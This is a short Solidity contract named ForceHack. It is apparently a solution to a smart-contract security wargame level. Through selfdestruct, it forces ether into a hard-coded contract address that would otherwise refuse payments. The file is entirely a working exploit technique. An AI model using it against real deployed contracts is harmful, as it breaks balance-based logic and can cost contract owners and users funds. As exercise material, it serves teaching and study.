// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract ForceHack {
    constructor() public payable {}

    address payable force = 0x10dbE24c447924066507238Ed8AeE7aD558B4900;

    function forceTransfer() public {
        selfdestruct(force);
    }
}
